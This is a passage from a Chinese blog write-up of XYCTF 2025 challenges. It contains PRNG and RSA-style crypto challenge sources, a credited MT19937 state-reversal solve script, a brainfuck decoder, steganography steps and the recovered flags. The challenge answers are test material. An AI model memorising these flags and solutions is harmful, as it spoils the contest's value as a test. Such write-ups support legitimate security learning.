class="number">2496</span>)]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里还是<strong>MT19937</strong>，伪随机数算法的缺陷，<strong>2496*8=19968</strong>刚好够一轮<code>state</code>，注意到我们这里需要的是<strong>逆推</strong>上一个<code>state</code>(相当于反向预测吧)</p><p><img src="https://picx.zhimg.com/80/v2-4cd29979ffa498905e34d294cc0fc69a_1440w.png" alt="" /><br />所以<code>r</code>需要取反处理一下</p><p>此处借鉴一下<strong>未央师傅</strong>的<code>exp</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># https://github.com/JuliaPoo/MT19937-Symbolic-Execution-and-Solver</span></span><br><span class="line">sys.path.append(<span class="string">&#x27;MT19937-Symbolic-Execution-and-Solver-master/source&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MT19937 <span class="keyword">import</span> MT19937</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">enc = <span class="number">5042764371819053176884777909105310461303359296255297</span></span><br><span class="line">length = enc.bit_length()</span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">r = []</span><br><span class="line">r = [<span class="number">255</span>-i <span class="keyword">for</span> i <span class="keyword">in</span> r]</span><br><span class="line">rng_clone = MT19937(state_from_data = (r, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n//<span class="number">32</span>):</span><br><span class="line">        num = (rng_clone() &lt;&lt; (<span class="number">32</span> * i)) | num</span><br><span class="line">    num = rng_clone() &gt;&gt; (<span class="number">32</span> - (n % <span class="number">32</span>)) &lt;&lt; n//<span class="number">32</span>*<span class="number">32</span> | num</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">rng_clone.reverse_states(length//<span class="number">32</span>+<span class="number">1</span>)  <span class="comment"># 回退到生成前n个随机数之前的状态</span></span><br><span class="line">flag = enc ^^ getrandbits(<span class="number">176</span>-<span class="number">1</span>)    <span class="comment"># 172/8=21.5,22*8=176,可能存在误差所以减1试试</span></span><br><span class="line">flag = <span class="string">b&#x27;XYCTF&#123;&#x27;</span>+long_to_bytes(flag)+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment"># XYCTF&#123;___0h_51mple_r@nd0m___&#125;</span></span><br></pre></td></tr></table></figure><h2 id="prng_xxxx"><a class="markdownIt-Anchor" href="#prng_xxxx"></a> prng_xxxx*</h2><blockquote><p>Why is it called prng_xxxx?Well, to cut costs and improve efficiency, we “laid off” the LFSR. Of course, this means the PRNG now has to do a lot more work—so it’s getting way more salary! XDNote: You can check out prng_lfsr on <a href="https://tangcuxiaojikuai.xyz/post/cb7cb618.html">https://tangcuxiaojikuai.xyz/post/cb7cb618.html</a> for some inspiration.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, b, seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b</span>):</span><br><span class="line">        self.seed = seed</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.m = <span class="number">2</span>**<span class="number">128</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.seed * self.a + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> (self.seed &gt;&gt; <span class="number">64</span>) ^ (self.seed % <span class="number">2</span>**<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lfsr</span>:</span><br><span class="line">    <span class="comment"># 我被裁了/(ㄒoㄒ)/~~</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">47026247687942121848144207491837523525</span></span><br><span class="line"><span class="keyword">assert</span> b &lt; <span class="number">2</span>**<span class="number">128</span> <span class="keyword">and</span> seed &lt; <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">lcg = LCG(seed, a, b)</span><br><span class="line"><span class="built_in">print</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">0</span>] * <span class="number">64</span>])</span><br><span class="line"><span class="built_in">print</span>(AES.new(key=md5(<span class="built_in">str</span>(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>)))</span><br><span class="line"><span class="comment"># [17861431650111939539, 15632044669542972472, 18085804805519111109, 11630394250634164303, 10914687109985225138, 7348450425255618214, 10796029302647050328, 14267824433700366397, 9363967587530173835, 8995382728269798714, 3504283765121786984, 1312349325731613524, 10716889342831891752, 12298317818779713512, 8701992888199838445, 7261196699430834071, 4670657923849978944, 9833942603152121381, 18304734854303383637, 15945503654626665549, 6509330987395005461, 223169047706410182, 12990946817252956584, 3884858487227858459, 6366350447244638553, 10326924732676590049, 12989931141522347344, 9197940263960765675, 2481604167192102429, 1409946688030505107, 9263229900540161832, 266892958530212020, 14298569012977896930, 17318088100106133211, 4224045753426648494, 650161332435727275, 9488449142549049042, 8916910451165068139, 10116136382602356010, 6604992256480748513, 7375827593997920567, 1661095751967623288, 4143230452547340203, 4145435984742575053, 10465207027576409947, 16146447204594626029, 2807803679403346199, 10857432394281592897, 1494771564147200381, 2085795265418108023, 11756240132299985418, 13802520243518071455, 1191829597542202169, 16603089856395516862, 12517247819572559598, 14148806699104849454, 8174845389550768121, 15565523852832475714, 10046639095828632930, 15353735627107824646, 7003433641698461961, 11217699328913391211, 6392630836483027655, 7918524192972397836]</span></span><br><span class="line"><span class="comment"># b&#x27;l\x8bd,\xa3\xe7\x87*\xca\n\xd7\x11\xd6n=\xeaS`\xa4w\x94(\xb9\xf9\xb9\xc6\xe3\xc2\xfb\xdb\x80\xf6\x9f\xc7\xd1F&quot;`&#123;;V\xa7&#125;Z\xc0\xc0\xf6&lt;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="勒索病毒"><a class="markdownIt-Anchor" href="#勒索病毒"></a> 勒索病毒*</h2><blockquote><p>帝皇坤在渗透的时候不小心运行了一个exe文件，然后重要文件被加密了，你能帮帮他吗</p></blockquote><p><code>flag.txt.enc</code>：<code>bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835</code></p><p>然后是个<strong>可执行程序</strong></p><h2 id="复复复复数"><a class="markdownIt-Anchor" href="#复复复复数"></a> 复复复复数*</h2><blockquote><p>天啊，这个复复复复数比我认识中的复数还多出了……？</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ComComplex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span>):</span><br><span class="line">        self.value = value</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(self.value[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> k,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.value[<span class="number">1</span>:]):</span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            s += <span class="built_in">str</span>(i) +<span class="string">&#x27;ijk&#x27;</span>[k]</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i+j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(self.value,x.value)])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self,x</span>):</span><br><span class="line">        a = self.value[<span class="number">0</span>]*x.value[<span class="number">0</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">1</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">3</span>]</span><br><span class="line">        b = self.value[<span class="number">0</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">3</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">2</span>]</span><br><span class="line">        c = self.value[<span class="number">0</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">1</span>]</span><br><span class="line">        d = self.value[<span class="number">0</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> ComComplex([a,b,c,d])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mod__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i % x <span class="keyword">for</span> i <span class="keyword">in</span> self.value])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, x, n=<span class="literal">None</span></span>):</span><br><span class="line">        tmp = ComComplex(self.value)</span><br><span class="line">        a = ComComplex([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">while</span> x:</span><br><span class="line">            <span class="keyword">if</span> x &amp; <span class="number">1</span>:</span><br><span class="line">                a *= tmp</span><br><span class="line">            tmp *= tmp</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                a %= n</span><br><span class="line">                tmp %= n</span><br><span class="line">            x &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">r = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q * r</span><br><span class="line"></span><br><span class="line">P = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(hint) == <span class="number">20</span></span><br><span class="line">hints = ComComplex([bytes_to_long(hint[i:i+<span class="number">5</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>,<span class="number">5</span>)])</span><br><span class="line">keys = ComComplex([<span class="number">0</span>, p, q, r])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint =&#x27;</span>,hints)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift =&#x27;</span>,hints*keys%P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;P =&#x27;</span>,P)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65547</span></span><br><span class="line">m = ComComplex([bytes_to_long(flag[i:i+<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>)])</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">hint = 375413371936+452903063925i+418564633198j+452841062207k</span></span><br><span class="line"><span class="string">gift = 8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729+20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171i+22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868j+40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863k</span></span><br><span class="line"><span class="string">P = 8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span></span><br><span class="line"><span class="string">n = 408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span></span><br><span class="line"><span class="string">c = 212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103+24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825i+45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125j+96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385k</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> reference</h2><p>后续这三题怕是不好复现了……</p><ul><li><a href="https://blog.weyung.cc/2025/04/04/2025%20XYCTF/#Crypto">未央师傅</a></li></ul><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="xgctf"><a class="markdownIt-Anchor" href="#xgctf"></a> XGCTF</h2><blockquote><p>2024年CTFshow举办了一场名为“西瓜杯”的比赛（XGCTF）。其中LamentXU在出题的时候，从某场比赛拉了道原题下来改了改，结果传文件的时候传错了传成原题了。因为这件事LamentXU的损友dragonkeep在他之前的博客上的原题wp上加了一段flag来嘲笑LamentXU。请你找到XGCTF中唯一由LamentXU出的题，并找出这题对应的原题，接着找到dragonkeep师傅的博客，并从博客上讲解该题的博文中找到flag。（hint：dragonkeep师傅因为比较穷买不起域名，因此他博客的域名在dragonkeep的基础上多了个字母）<br />（出题人：LamentXU）</p></blockquote><p>可以去<code>ctfshow</code>直接找<code>XGCTF</code>，看出题人出了哪道题目<br />然后，找<code>dragonkeep</code>师傅的博客，过程不细说，懂的自然懂，直接放<a href="https://dragonkeeep.top/category/CISCN%E5%8D%8E%E4%B8%9C%E5%8D%97WEB-Polluted">结果</a><br /><img src="https://pic1.zhimg.com/80/v2-ba5e147c9715d7bf3e8e933b0510bdcb_1440w.png" alt="" /><br /><code>flag&#123;1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me&#125;</code></p><h2 id="签个到吧"><a class="markdownIt-Anchor" href="#签个到吧"></a> 签个到吧</h2><blockquote><p>最小的，具有图灵完备性的语言是？</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&gt;+++++++++++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]</span><br></pre></td></tr></table></figure><p><code>brainfuck</code>，但很遗憾解不出来，没关系交给<code>AI</code>，很高兴<code>AI</code>利用它强大的分析能力，分析出<code>flag</code>的形式了，即<code>&gt;</code>到<code>[</code>之间的<strong>加号数量</strong>乘上<code>&lt;&gt;</code>之间的<strong>加号数量</strong>就是<code>flag</code>的<strong>ASCII值</strong>(本质原理确实如此)，还是要拷打它要个脚本，因为统计的太拉了。。。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_bf_string</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().strip()</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="comment"># 查找第一个 &quot;&gt;&quot; 字符</span></span><br><span class="line">        idx_gt = data.find(<span class="string">&quot;&gt;&quot;</span>, pos)</span><br><span class="line">        <span class="keyword">if</span> idx_gt == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从 &quot;&gt;&quot; 后计数连续的 &quot;+&quot;</span></span><br><span class="line">        idx = idx_gt + <span class="number">1</span></span><br><span class="line">        count_out = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(data) <span class="keyword">and</span> data[idx] == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">            count_out += <span class="number">1</span></span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 若没有遇到 &quot;[&quot;，则说明解析结束</span></span><br><span class="line">        <span class="keyword">if</span> idx &gt;= <span class="built_in">len</span>(data) <span class="keyword">or</span> data[idx] != <span class="string">&quot;[&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从 &quot;[&quot; 后查找第一个 &quot;&lt;&quot;</span></span><br><span class="line">        idx_bracket = data.find(<span class="string">&quot;&lt;&quot;</span>, idx)</span><br><span class="line">        <span class="keyword">if</span> idx_bracket == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从 &quot;&lt;&quot; 后计数连续的 &quot;+&quot;</span></span><br><span class="line">        idx = idx_bracket + <span class="number">1</span></span><br><span class="line">        count_in = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(data) <span class="keyword">and</span> data[idx] == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">            count_in += <span class="number">1</span></span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 若没有遇到 &quot;&gt;&quot; 则跳出</span></span><br><span class="line">        <span class="keyword">if</span> idx &gt;= <span class="built_in">len</span>(data) <span class="keyword">or</span> data[idx] != <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算乘积并转换为字符</span></span><br><span class="line">        product = count_out * count_in</span><br><span class="line">        result += <span class="built_in">chr</span>(product)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 更新 pos 到刚刚匹配完的 &quot;&gt;&quot; 之后，继续下一段</span></span><br><span class="line">        pos = idx + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    filename = <span class="string">&quot;C:\\Users\\27920\\Desktop\\bf.txt&quot;</span></span><br><span class="line">    decoded = decode_bf_string(filename)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密结果:&quot;</span>, decoded)</span><br></pre></td></tr></table></figure><p><code>flag&#123;W3lC0me_t0_XYCTF_2025_Enj07_1t!&#125;</code></p><p>题目这里只是缺乏输出，我们只需要使用<code>.</code>即可(难道你没发现少了这个东西吗)<br />全部的<code>&lt;[</code>替换为<code>&lt;.[</code>即可</p><h2 id="曼波曼波曼波"><a class="markdownIt-Anchor" href="#曼波曼波曼波"></a> 曼波曼波曼波</h2><p>给了一张假<code>flag</code>的二维码，然后<code>smn.txt</code>很明显是<strong>倒序的base64</strong>，把图像下载下来发现<strong>jpg图片尾</strong>有<strong>压缩包</strong>，导出，压缩包密码盲猜<code>XYCTF2025</code>，然后得到两张<strong>看似一样</strong>的照片，直接上<strong>双图盲水印</strong><br /><img src="https://pica.zhimg.com/80/v2-b467d0602066750608d0c1fbdc382e36_1440w.png" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-202a1c786a9ac0b51a77671bcd5aa5cc_1440w.png" alt="" /><br /><code>XYCTF&#123;easy_yin_xie_dfbfuj877&#125;</code></p><h2 id="mader也要当ctfer"><a class="markdownIt-Anchor" href="#mader也要当ctfer"></a> MADer也要当CTFer*</h2><blockquote><p>你知道PRTShark是什么意思吗，P是位置，R是旋转，T是不透明度，S是缩放，而hark代表这道题是hard to hack吧</p></blockquote><p>蚝康，这题需要使用到<code>AE</code>，一款图形视频处理软件，那还是蹲个<code>wp</code>观摩一下吧</p><h2 id="会飞的雷克萨斯"><a class="markdownIt-Anchor" href="#会飞的雷克萨斯"></a> 会飞的雷克萨斯*</h2><blockquote><p>2025年1月30日W1ndys上网冲浪时，收到了舍友发来的聊天记录，聊天记录显示，一小孩放鞭炮引爆地面，请定位爆炸点的具体位置，该题解出需要通过正常的osint题目做题思路</p></blockquote><p>好，是社工，笑死，不玩(狗头)</p><h2 id="greedymen"><a class="markdownIt-Anchor" href="#greedymen"></a> Greedymen*</h2><blockquote><p>Isn’t it ironic? Greed isn’t limited. Freedom is a limited resource.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">nc <span class="number">8.147</span><span class="number">.132</span><span class="number">.32</span> <span class="number">17479</span></span><br><span class="line">Welcome to the Greedy Game</span><br><span class="line">Your goal <span class="keyword">is</span> to be <span class="keyword">as</span> greedy <span class="keyword">as</span> possible</span><br><span class="line"><span class="number">1.</span>Play</span><br><span class="line"><span class="number">2.</span>Rules</span><br><span class="line"><span class="number">3.</span>Quit</span><br><span class="line"><span class="number">2</span></span><br><span class="line">There are <span class="number">3</span> levels, level <span class="number">1</span>/<span class="number">2</span>/<span class="number">3</span> has number <span class="number">1</span> to <span class="number">50</span>/<span class="number">100</span>/<span class="number">200</span> on board to choose <span class="keyword">from</span></span><br><span class="line">Each number you choose, you get the corresponding points</span><br><span class="line">However, your opponent will choose <span class="built_in">all</span> the factors of the number you choose, <span class="keyword">and</span> get the points of each factor</span><br><span class="line">You can <span class="keyword">not</span> choose numbers that are already assigned to a player</span><br><span class="line">You are only allow to choose the number <span class="keyword">if</span> it has at least one factor <span class="keyword">not</span> choosen</span><br><span class="line">If you can<span class="string">&#x27;t choose anymore, the rest of the board goes to your opponent</span></span><br><span class="line"><span class="string">To make the challenge harder, there is a counter that starts with 19/37/76 in level 1/2/3, each time you choose a number, the counter decreases by 1</span></span><br><span class="line"><span class="string">When it reaches 0, and the game will end, and the unassigned numbers will go to your opponent</span></span><br><span class="line"><span class="string">The challenge is always solvable</span></span><br><span class="line"><span class="string">Player with highest score wins</span></span><br><span class="line"><span class="string">Good Luck!</span></span><br><span class="line"><span class="string">1.Play</span></span><br><span class="line"><span class="string">2.Rules</span></span><br><span class="line"><span class="string">3.Quit</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Level 1/3 50 Numbers</span></span><br><span class="line"><span class="string">Unassigned Numbers: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]</span></span><br><span class="line"><span class="string">Counter: 19</span></span><br><span class="line"><span class="string">Your Score: 0</span></span><br><span class="line"><span class="string">Opponent Score: 0</span></span><br><span class="line"><span class="string">Choose a Number:49</span></span><br><span class="line"><span class="string">Unassigned Numbers: [2, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50]</span></span><br><span class="line"><span class="string">Counter: 18</span></span><br><span class="line"><span class="string">Your Score: 49</span></span><br><span class="line"><span class="string">Opponent Score: 8</span></span><br><span class="line"><span class="string">Choose a Number:</span></span><br></pre></td></tr></table></figure><p>肥肠好玩的一个游戏</p><h2 id="sins"><a class="markdownIt-Anchor" href="#sins"></a> sins*</h2><blockquote><p>“Come now, let us settle the matter,” says the LORD. “Though your sins are like scarlet, they shall be as white as snow; though they are red as crimson, they shall be like wool. - Isaiah 1:18</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;For there are three that bear record in heaven, the Father, the Word, and the Holy Ghost&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;But here we have four cases bearing witness&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">i_pow</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">4</span> == <span class="number">0</span>: <span class="comment"># as the 40 days of flood</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">1</span>: <span class="comment"># as the 1 true God</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;i&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">2</span>: <span class="comment"># as the 2 tablets of stone</span></span><br><span class="line">        <span 